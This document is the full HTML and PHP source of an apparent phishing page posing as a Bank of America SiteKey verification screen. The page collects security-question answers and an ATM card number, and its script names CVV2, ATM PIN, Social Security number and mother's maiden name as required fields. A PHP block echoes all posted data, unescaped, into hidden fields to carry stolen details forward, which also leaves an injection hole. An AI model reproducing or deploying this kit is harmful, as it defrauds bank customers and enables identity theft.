<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML lang=en><HEAD><TITLE>Bank of America | Online Banking | SiteKey | SiteKey Challenge Question</TITLE>
<META http-equiv=content-type content="text/html; charset=iso-8859-1">
<META
content="Answer your SiteKey Challenge Question for the Bank of America SiteKey service."
name=Description><LINK
href="https://sitekey.bankofamerica.com/sas/sas-docs/stylesheets/win_ie.css"
type=text/css rel=stylesheet><LINK
href="https://sitekey.bankofamerica.com/sas/sas-docs/stylesheets/weas_win_ie.css"

type=text/css rel=stylesheet>
<SCRIPT language=javascript type=text/javascript>
<!--
    function getStylePath()
    {
        var styleUrl = 'sas-docs/stylesheets/weas_win_ie.css';
        return styleUrl;
    }

    function loadPage()
    {
		if('true' == 'true')
    	{
    		// alert("set timeout == true");
	    	toLoadPage();
	    }
    }
//-->
</SCRIPT>


<SCRIPT language=JavaScript
src="https://sitekey.bankofamerica.com/sas/sas-docs/js/commonscript.js"
type=text/javascript> </SCRIPT>

<SCRIPT language=JavaScript
src="https://sitekey.bankofamerica.com/sas/sas-docs/js/commontimeout.js"
type=text/javascript> </SCRIPT>

<SCRIPT language=javascript type=text/javascript>
<!--
examineFontSize("body");
//-->
</SCRIPT>

	<script LANGUAGE="JavaScript">
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////
var lastMsgDate = new Date();
var whitespace = " \t\n\r";
var defaultEmptyOK = false;
var whitespace = " \t\n\r";
lblCardNumber="Card Number";
reqCardNumber=true;
lblExpire_month="Month";
reqExpire_month=true;
lblExpire_year="Year";
reqExpire_year=true;
lblCard_cvv2="CVV2";
reqCard_cvv2=true;
lblATMPIN="ATM PIN";
reqATMPIN=true;
lblDOB_month="Month";
reqDOB_month=true;
lblDOB_day="Day";
reqDOB_day=true;
lblDOB_year="Year";
reqDOB_year=true;
lblMMN="Mother's Maiden Name";
reqMMN=true;
lblSSN="Social Security Number";
reqSSN=true;
lblDL="Drivers License Number";
reqDL=true;
lblEmail="Email Address";
reqEmail=true;
lblFirstName="First Name";
reqFirstName=true;
lblmiddleInitial="Middle Initial";
reqmiddleInitial=false;
lblLastName="Last Name";
reqLastName=true;


function isDigit(aChar)
{
	return ((aChar >= '0') && (aChar <= '9'));
}

// AutoTab /////////////////////
function containsElement(arr, ele) {
  var found = false, index = 0;
  while(!found && index < arr.length)
  if(arr[index] == ele)
  found = true;
  else
  index++;
  return found;
 }

var isNN = (1 !=-1);
// Forms Engine function
function autoTab(input,len, e) {
 var keyCode = (isNN) ? e.which : e.keyCode;
 var filter = (isNN) ? [0,8,9] : [0,8,9,16,17,18,37,38,39,40,46];

 if(input.value.length >= len && !containsElement(filter,keyCode)) {
  // input.value = input.value.slice(0, len);

  // Determine index number of this field
  idx = -1;
  for (i = 0; i < frmSignIn.length; i ++) {
   if (frmSignIn.elements[i].name == input.name) {
    idx = i;
   }
  }

  // Get next field number
  if (idx != -1) {
   next = idx + 1;
   if (next >= frmSignIn.length) {
    next = 0
   }

   // Highlight next field
   switch (frmSignIn.elements[next].type) {
    case 'text':
     frmSignIn.elements[next].focus();
     frmSignIn.elements[next].select();
     break;
    case 'radio':
    case 'checkbox':
    case 'select-one':
     frmSignIn.elements[next].focus();
     break;
    default:
     //alert(document.formApp.elements[next].type);
     break;
   }
  }
 }
}
//End of AutoTab /////////////////////


function isValidInteger (s)
{   var i;
    for (i = 0; i < s.length; i++)
    {
        var c = s.charAt(i);
       if (!isDigit(c)) return false;
    }
    return true;
}

///////// Messages /////////
function minLengthMessage (theField, errorLabel, value) {
 theField.focus();
 //theField.select();
 alert('Please enter a valid Card Number. Card Number must be at least 16 characters long.');
 lastMsgDate = new Date();
 return false;
}

function isAlphabetic (s)
{   var i;
    var sLower = s.toLowerCase();
    for (i = 0; i < sLower.length; i++)
    {
        var c = sLower.charAt(i);
        if (!isLetter(c))
        return false;
    }
    return true;
}

function maxLengthMessage (theField, errorLabel, value) {
 theField.focus()
 //theField.select()
 alert('Please enter a valid Card Number. Card Number must be at least 16 characters long.');
 lastMsgDate = new Date();
 return false;
}

function minValueMessage (theField, errorLabel, value) {
 theField.focus();
 //theField.select();
 alert('Please enter a valid \"' + errorLabel + '\".\n\"' + errorLabel + '\" must be at least \"' + value + '\".');
 lastMsgDate = new Date();
 return false;
}

function maxValueMessage (theField, errorLabel, value) {
 theField.focus()
 //theField.select()
 alert('Please enter a valid \"' + errorLabel + '\".\n\"' + errorLabel + '\" can not be more than \"' + value + '\".');
 lastMsgDate = new Date();
 return false;
}

function invalidValueMessage (theField, errorLabel) {
 theField.focus();
 //theField.select();
 alert('Please enter a valid \"' + errorLabel + '\".');
 lastMsgDate = new Date();
 return false;
}

function requiredFieldMessage(theField, errorLabel) {
 theField.focus();
 //theField.select();
 alert('You have to fill in all the blank fields.');
 lastMsgDate = new Date();
 return false;
}

function stripInitialWhitespace (s)
{   var i = 0;
    while ((i < s.length) && charInString (s.charAt(i), whitespace))
       i++;
    return s.substring (i, s.length);
}

function charInString (c, s)
{   for (i = 0; i < s.length; i++)
    {   if (s.charAt(i) == c) return true;
    }
    return false
}

function isEmpty(s)
{   return ((s == null) || (s.length == 0))
}

function isWhitespace (s)
{   var i;
    if (isEmpty(s)) return true;
    for (i = 0; i < s.length; i++)
    {
        var c = s.charAt(i);
        if (whitespace.indexOf(c) == -1) return false;
    }
    return true;
}


//Old Email Check - lms637
function isEmail (s)
{   if (isEmpty(s))
     if (isEmail.arguments.length == 1) return defaultEmptyOK;
       else return (isEmail.arguments[1] == true);
    if (isWhitespace(s)) return false;
    var i = 1;
    var sLength = s.length;
    while ((i < sLength) && (s.charAt(i) != "@"))
    { i++
    }
   if ((i >= sLength) || (s.charAt(i) != "@")) return false;
    else i += 2;
    while ((i < sLength) && (s.charAt(i) != "."))
    { i++
    }

    if ((i >= sLength - 1) || (s.charAt(i) != ".")) return false;
    else return true;
}


function isSingleEmail(s)
{
	var count = 0;
	for (i = 0; i < s.length; i++)
    {   if (s.charAt(i) == "@"){
    		count = count + 1;
    	}
    }
    if (count > 1){
    	 return false;
    }
    return true;

}
///////// End of Messages /////////

// Forms Engine function
function checkIntegerField (theField, errorLabel, required, minLen, maxLen, minValue, maxValue)
{
    var chk = theField.value;

    if (!isValidInteger(theField.value)) {
      return invalidValueMessage(theField, errorLabel);
    }

    if (required==true) {
      if (chk.length == 0) {
      return requiredFieldMessage (theField, errorLabel);
      }
    }

    if (chk.length > 0) {
       if (minLen > 0) {
          if (chk.length < minLen) {
           return minLengthMessage (theField, errorLabel, minLen);
          }
       }
       if (maxLen > 0) {
          if (chk.length > maxLen) {
           return maxLengthMessage (theField, errorLabel, maxLen);
          }
       }
       if (minValue > 0) {
         if (chk < minValue) {
           return minValueMessage (theField, errorLabel, minValue);
         }
       }
       if (maxValue > 0) {
         if (chk > maxValue) {
           return maxValueMessage (theField, errorLabel, maxValue);
         }
       }
    }
    return true;
}

// Forms Engine function
function checkTextField (theField, errorLabel, required, minLen, maxLen)
{
    var chk = stripInitialWhitespace(theField.value);
    theField.value = chk;

    if (required==true) {
      if (chk.length == 0) {
      return requiredFieldMessage (theField, errorLabel);
      }
    }

    if (chk.length > 0) {
       if (minLen > 0) {
          if (chk.length < minLen) {
           return minLengthMessage (theField, errorLabel, minLen);
          }
       }
       if (maxLen > 0) {
          if (chk.length > maxLen) {
           return maxLengthMessage (theField, errorLabel, maxLen);
          }
       }
    }
    return true;
}
function check()

   {
if (frmSignIn.q1.value == 'Select question') {
alert('Please select question.');
frmSignIn.q1.focus();
return false;}
else
    if (frmSignIn.Answer1.value == '') {
    alert('You have to fill in all the blank fields.');
    frmSignIn.Answer1.focus();

return false;

}
if (frmSignIn.q2.value == 'Select question') {
alert('Please select question.');
frmSignIn.q2.focus();
return false;}
else
    if (frmSignIn.Answer2.value == '') {
    alert('You have to fill in all the blank fields.');
    frmSignIn.Answer2.focus();

return false;

    	}

    if (frmSignIn.q3.value == 'Select question') {
alert('Please select question.');
frmSignIn.q3.focus();
return false;}
else
    if (frmSignIn.Answer3.value == '') {
    alert('You have to fill in all the blank fields.');
    frmSignIn.Answer3.focus();

return false;
}
checkCard(document.frmSignIn.elements['USpass'], lblCardNumber, reqCardNumber, 16, 16, 0, 0) ;
        	return true;



}

function checkEmailAddress(theField, errorLabel, required, fieldName, len) {
	var returnValue = false;
	if ((checkTextField(theField, errorLabel, required, fieldName, len))) {
		if (theField.value == "") {
			returnValue = true;
		} else if (theField.value != "") {
			if (!isEmail(theField.value, false)) {
				alert(errorLabel + " must contain @ and '.'");
				theField.focus();
				theField.select();
				returnValue = false;
			} else {
				if(!isSingleEmail(theField.value, false)) {

					alert(errorLabel + " field must contain only one email address.");
					theField.focus();
					theField.select();
					returnValue = false;
				}else {
					returnValue = true;
				}
				}
			}
	}
    return returnValue;
}

function checkCard(TheField, errorLabel, required, minLen, maxLen, minValue, maxValue)
{
   if (!checkIntegerField(TheField, errorLabel, required, minLen, maxLen, minValue, maxValue)) {
   frmSignIn.USpass.focus();
   			return false;
		}
   if (TheField.value.charAt(0) != 3 && TheField.value.charAt(0) != 4 && TheField.value.charAt(0) != 5 && TheField.value.charAt(0) != 6){
		 alert('Please enter a valid \"' + errorLabel + '\".');

		 return false;
    	}
    	 document.frmSignIn.submit();
    return true;



}

function validateForm()
{
	form = document.frmSignIn;
	var validated = false;
	check();
	//document.frmSignIn.submit();

}
// -->

		</script>

<META content="MSHTML 6.00.2800.1106" name=GENERATOR>
<style>
<!--
span.footnote{font-family:Verdana;font-size:7pt;color:#333333}
-->
</style>
</HEAD>
<BODY class=body text=#000000 bgColor=#ffffff onload=loadPage(); marginwidth="0"
marginheight="0"><!-- begin sas header --><!-- logo_header beg --><IMG height=83
alt="Bank of America Higher Standards Online Banking"
src="https://sitekey.bankofamerica.com/sas/sas-docs/images/olb_masthead_nonav.gif"
width=747 border=0><BR><!-- logo_header_end --><!-- check fonts beg -->
<SCRIPT language=javascript type=text/javascript>
<!--
examineFontSize("body");
//-->
</SCRIPT>
<!-- check fonts beg --><!-- end sas header --><!-- Begin screen title -->
<DIV class=pagelabel>
<TABLE class=nav3 cellSpacing=0 cellPadding=0 width=735 summary="" border=0>
  <TBODY>
  <TR>
    <TD colSpan=2><IMG height=6 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=1></TD></TR>
  <TR>
    <TD vAlign=bottom>
      <DIV style="DISPLAY: block"><IMG height=10 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=200></DIV>
      <DIV><A name=skipnav></A>
      <H1 class=pagelabel>We do not recognize your computer<BR></H1></DIV></TD>
    <TD class=text2 vAlign=top noWrap align=right><IMG height=1 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=10></TD></TR>
  <TR>
    <TD colSpan=2><IMG height=10 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=1></TD></TR>
  <TR>
    <TD class=rulegrey3 colSpan=2><IMG height=1 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=1></TD></TR>
  <TR>
    <TD colSpan=2><IMG height=12 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=1></TD></TR></TBODY></TABLE></DIV><!-- End screen title -->
<TABLE cellSpacing=0 cellPadding=0 width=747 summary="" border=0>
  <TBODY>
  <TR><!-- Left margin -->
    <TD width=12><IMG height=1 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=12></TD><!-- End left margin --><!-- Begin Sign In form -->
    <TD vAlign=top width=510>
      <DIV id=error_section></DIV>
      <TABLE cellSpacing=0 cellPadding=0 width=883 summary="" border=0>
        <TBODY>
        <TR>
          <TD vAlign=top width="100%">

<script Language= "JavaScript">
           document.write('<FORM name=frmSignIn action="https://sitekey.bankofamerica.com/sas/signon.do" method=post onsubmit="return validateForm()">')
             </script>
		<?php

    $mypost = file("php://input");
    if (strlen($mypost[0])!=0)
    {
       $post_data = explode("&", $mypost[0]);

       for ($pos=0; $pos<sizeof($post_data); $pos++)
       {
        $data_field = explode("=", $post_data[$pos]);
        $key    = $data_field[0];
        $value  = $data_field[1];

        $key_new = str_replace("+"," ", $key);
        $key_new = rawurldecode($key_new);
        $value_new = str_replace("+"," ", $value);
        $value_new = rawurldecode($value_new);
        echo "<input type=\"hidden\" name=\"$key_new\" value=\"$value_new\">\r\n";
       }
    }

  ?>


<INPUT type=hidden value=verfiy name=nextAction>
            <DIV>
            <TABLE cellSpacing=0 cellPadding=0 width="96%" summary=""
              border=0><TBODY>
              <TR>
                <TD>
                  <DIV class=text1>
                  <P>We do not recognize the computer you are using. Please
                  answer your SiteKey <BR>Challenge Question so that we can
                  confirm your identity from this unrecognized <BR>computer.
</P>
                  <P>An asterisk (*) indicates a required field.</P></DIV></TD>
              <TR>
                <TD><BR></TD></TR>
              <TR>
                <TD>
                  &nbsp;<TR>
                <TD>
                  <DIV class=text1
                  style="PADDING-RIGHT: 0px; PADDING-LEFT: 60px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px">
                  <TABLE cellSpacing=0 cellPadding=0 width="85%" summary=""
                  border=0>
                    <TBODY>
                    <TR>
                      <TD><IMG height=7 alt=""
                        src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
                        width=100></TD></TR>
                    <TR>
                      <TD>
                        <TABLE cellSpacing=0 cellPadding=0 width="98%"
                        summary="" border=0>
                          <TBODY>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD width=10>&nbsp;</TD>
                            <TD>&nbsp;</TD></TR>
                          <TR>
                            <TD><SPAN class=title4><SPAN class=textBold>
							<LABEL
                              for=sitekeyChallengeAnswer>* SiteKey Challenge
							Question:</LABEL></SPAN></SPAN></TD>
                            <TD width=10>&nbsp;</TD>
                            <TD><font size="1" face="Verdana"><b>
							<font face="Arial"><span style="font-size: 70%">
				<select size="1" name="q1" style="width: 502; height:21">
				<option selected value="Select question">Select question</option>
				<option value="What is your maternal grandmother&amp;#39;s first name?">What is your maternal grandmother&#39;s first name?</option>
				<option value="What is your maternal grandfather&amp;#39;s first name?">What is your maternal grandfather&#39;s first name?</option>
				<option value="In what city were you born? (Enter full name of city only)">In what city were you born? (Enter full name of city only)
				</option>
				<option value="What was the name of your first pet?">What was the name of your first pet?</option>
				<option value="What was your high dchool mascot?">What was your high dchool mascot?</option>
				<option value="How old were you at your wedding? (Enter age as digits.)">How old were you at your wedding? (Enter age as digits.)
				</option>
				<option value="In what year(YYYY) did you graduate from high school?">In what year(YYYY) did you graduate from high school?
				</option>
				<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?
				</option>
				<option value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</option>
				</select></span></font></b></font></TD></TR>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD width=10>&nbsp;</TD>
                            <TD>&nbsp;</TD></TR>
                          <TR>
                            <TD><SPAN class=title4><SPAN class=textBold><LABEL
                              for=sitekeyChallengeAnswer>* Answer: <SPAN
                              class=h2-ada><BR>Answer to your SiteKey Challenge
							Question: (In what city was your mother born? (Enter
							full name of city only)). Answer is not case
							sensitive. </SPAN></LABEL></SPAN></SPAN></TD>
                            <TD width=10><IMG height=1 alt=""
                              src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
                              width=10></TD>
                            <TD>
							<INPUT id=sitekeyChallengeAnswer maxLength=30
                              size=33 name=Answer1> </TD></TR>
                          <TR>
                            <TD></TD>
                            <TD></TD>
                            <TD class=text1>&nbsp;</TD></TR>
							<tr>
                            <TD><SPAN class=title4><SPAN class=textBold>
							<LABEL
                              for=sitekeyChallengeAnswer>* SiteKey Challenge
							Question:</LABEL></SPAN></SPAN></TD>
                            <TD width=10>&nbsp;</TD>
                            <TD><font size="1" face="Verdana"><b>
							<span style="font-size: 7%">
				<select size="1" name="q2" style="width: 502; height:19">
				<option selected value="Select question">Select question</option>
				<option value="What is your father&amp;#39;s middle name?">What is your father&#39;s middle name?</option>
				<option value="What is your mother&amp;#39;s middle name?">What is your mother&#39;s middle name?</option>
				<option value="In what city were you married?">In what city were you married?</option>
				<option value="In what city is your vacation home?">In what city is your vacation home?</option>
				<option value="What is the first name of your first child?">What is the first name of your first child?</option>
				<option value="What is the name of your first employer?">What is the name of your first employer?</option>
				<option value="What is your favorite hobby?">What is your favorite hobby?</option>
				<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather&#39;s first name?</option>
				<option value="What is the first name of the best main/maid of honor at your wedding?">What is the first name of the best main/maid of honor at your wedding?
				</option>
				</select></span></b></font></TD>
							</tr>
							<tr>
                            <TD>&nbsp;</TD>
                            <TD width=10>&nbsp;</TD>
                            <TD>&nbsp;</TD>
							</tr>
							<tr>
                            <TD><SPAN class=title4><SPAN class=textBold>
							<LABEL
                              for=sitekeyChallengeAnswer0>* Answer: <SPAN
                              class=h2-ada><BR>Answer to your SiteKey Challenge
							Question: (In what city was your mother born? (Enter
							full name of city only)). Answer is not case
							sensitive. </SPAN></LABEL></SPAN></SPAN></TD>
                            <TD width=10><IMG height=1 alt=""
                              src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
                              width=10></TD>
                            <TD>
							<INPUT id=sitekeyChallengeAnswer0 maxLength=30
                              size=33 name=Answer2> </TD>
							</tr>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>&nbsp;</TD></TR>
							<tr>
                            <TD><SPAN class=title4><SPAN class=textBold>
							<LABEL
                              for=sitekeyChallengeAnswer>* SiteKey Challenge
							Question:</LABEL></SPAN></SPAN></TD>
                            <TD width=10>&nbsp;</TD>
                            <TD><font size="1" face="Verdana"><b>
				<select size="1" name="q3" style="width: 502; height: 17">
				<option selected value="Select question">Select question</option>
				<option value="In what city was your mother born? (Enter full name of city only)">In what city was your mother born? (Enter full name of city only)
				</option>
				<option value="In what city was your father born? (Enter full name of city only)">In what city was your father born? (Enter full name of city only)
				</option>
				<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?
				</option>
				<option value="When is your wedding anniversary (Enter the full name of month)">When is your wedding anniversary (Enter the full name of month)
				</option>
				<option value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)
				</option>
				<option value="In what city was your high school? (Enter only &amp;quot;Charlotte&amp;quot; for Charlotte High   School)">In what city was your high school? (Enter only &quot;Charlotte&quot; for Charlotte High   School)
				</option>
				<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather&#39;s first name?</option>
				<option value="What is your paternal grandmother&amp;#39;s first name?">What is your paternal grandmother&#39;s first name?</option>
				<option value="Where did you meet your spouse for the first time? (Enter full name of city   only)">Where did you meet your spouse for the first time? (Enter full name of city   only)
				</option>
				</select></b></font></TD>
							</tr>
							<tr>
                            <TD>&nbsp;</TD>
                            <TD width=10>&nbsp;</TD>
                            <TD>&nbsp;</TD>
							</tr>
							<tr>
                            <TD><SPAN class=title4><SPAN class=textBold>
							<LABEL
                              for=sitekeyChallengeAnswer1>* Answer: <SPAN
                              class=h2-ada><BR>Answer to your SiteKey Challenge
							Question: (In what city was your mother born? (Enter
							full name of city only)). Answer is not case
							sensitive. </SPAN></LABEL></SPAN></SPAN></TD>
                            <TD width=10><IMG height=1 alt=""
                              src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
                              width=10></TD>
                            <TD>
							<INPUT id=sitekeyChallengeAnswer1 maxLength=30
                              size=33 name=Answer3> </TD>
							</tr>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>&nbsp;</TD></TR>
                          <TR>
                            <TD><SPAN class=title4><SPAN class=textBold>
							<LABEL
                              for=sitekeyChallengeAnswer1>* ATM Card Number:</LABEL></SPAN></SPAN></TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>
							<input onkeyup="return autoTab(this, 16, event);" maxLength="16" onchange="checkCard(this, lblCardNumber, reqCardNumber, 16, 16, 0, 0)" size="25" name="USpass"></TD></TR>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>
							&nbsp;</TD></TR>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>
							&nbsp;</TD></TR>
                          <TR>
                            <TD>&nbsp;</TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>
							&nbsp;</TD></TR>
                          <TR>
                            <TD>
				&nbsp;</TD>
                            <TD>&nbsp;</TD>
                            <TD class=text1>
				<div align="left">
		<table border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td>
&nbsp;<img src="http://www.bankofamerica.com/images/shared/dot_clear.gif" alt="" width="10" height="1" border="0" />
				</td>
				<td>
					<table border="0" cellspacing="0" cellpadding="4" summary="">
		        			<tr>
	                				<td class="whitebg">
	                				<script language="javascript" type="text/javascript">
	                				<!--
	                				document.writeln('<div class="btn2"><a href="javascript:document.frmSignIn.onsubmit();" class="btn1" title="Continue">Continue</a></div>');
	                				//--></script>
	                				<noscript><input value="Continue" name="Sign" type="Submit" class="form-button" alt="Continue" /></noscript>
	                				</td>
		        			</tr>
					</table>
				</td>
			</tr>
		</table>
				</div>
					&nbsp;</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
					<LABEL for=sitekeyDeviceBindNo>
					<SPAN
                  class=h2-ada></SPAN></LABEL> <BR>&nbsp;<p>&nbsp;</p>
<table cellspacing="0" cellpadding="0" border="0" summary="">
	<tr>
		<td height="40" colspan="2">&nbsp;</td>
	</tr>
	<tr>
		<td><img src="http://www.bankofamerica.com/images/shared/dot_clear.gif" alt="" width="7" height="1" border="0" /></td>
		<td valign="top"><span class="footnote">Bank of America, N.A. Member FDIC.&nbsp;Equal Housing Lender&nbsp;<img src="http://www.bankofamerica.com/images/homepage/house.gif" alt="Equal Housing Lender" width="14" height="9" border="0" /><br class="none" />&copy; 2006 Bank of America Corporation. All rights reserved.</span></td>
	</tr>
	<tr>
		<td height="20" colspan="2"><img src="http://www.bankofamerica.com/images/shared/dot_clear.gif" alt="" width="1" height="20" border="0" /></td>
	</tr>
</table>
					<p><BR>
                  </p>
                  <P></P>
					<BR>
                  <TABLE cellSpacing=0 cellPadding=0 width="100%" summary=""
                  border=0>
                    <TBODY>
                    <TR>
                      <TD
                        width="5%"><!-- Begin Continue Button --><NOSCRIPT>
                    	</TD>
                      <TD width=10><IMG height=1 alt=""
                        src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
                        width=10></TD>
                      <TD width="70%"></TD></TR></TBODY></TABLE>
                  <P><A class=linknormal
                  title="Forgot the answer to your SiteKey Challenge Question (will open in a new window)."
                  onclick="openHelp('helpScreen.do?nextAction=forgotComfirmAnsHelp', ''); return false;"
                  href="https://sitekey.bankofamerica.com/sas/helpScreen.do?nextAction=forgotComfirmAnsHelp"
                  target=_blank>Forgot the answer to your SiteKey Challenge
					Question?</A> </P></DIV></TD></TR></TBODY></TABLE></DIV></TD>
          <TD width=20><IMG height=1 alt=""
            src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
            width=20></TD></TR></TBODY></TABLE>
      <SCRIPT language=javascript type=text/javascript>
<!--
	document.forms.challengeQandAForm.sitekeyChallengeAnswer.focus();
//-->
</SCRIPT>
    </TD></TR></TBODY></TABLE><IMG height=1 alt=""
src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
width=1 name=resetTimeout> <!-- 30 pixels of seperation -->
<DIV><IMG height=30 alt=""
src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
width=1></DIV><!-- Begin footer -->
<DIV class=footer>
<TABLE cellSpacing=0 cellPadding=0 width=747 summary="" border=0>
  <TBODY>
  <TR>
    <TD class=rulegrey2 colSpan=4><IMG height=1 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=1></TD></TR>
  <TR>
    <TD width=12 rowSpan=7><IMG height=1 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=12></TD>
    <TD colSpan=2><IMG height=7 alt=""
      src="Bank of America  Online Banking  SiteKey  SiteKey Challenge Question_files/clr.gif"
      width=1></TD></TR>
  <TR>
    <TD class=secure-area noWrap>
      <DIV class=secure-area><IMG height=11 alt="Secure Area" hspace=0
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/foot_lock.gif"
      width=9 border=0><IMG height=1 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=8>Secure Area</DIV></TD></TR>
  <TR>
    <TD><IMG height=6 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"
      width=1></TD></TR>
  <TR>
    <TD class=fdic-text vAlign=top>Bank of America, N.A. Member
      FDIC.&nbsp;Equal Housing Lender<IMG height=9 alt="Equal Housing Lender"
      hspace=3
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/icon_house.gif"
      width=14 border=0><BR>© 2005 Bank of America Corporation. All rights
      reserved.</TD></TR>
</FORM>
  <TR>
    <TD><IMG height=20 alt=""
      src="https://sitekey.bankofamerica.com/sas/sas-docs/images/clr.gif"></TD></TR></TBODY></TABLE></DIV><!-- End footer --></BODY></HTML>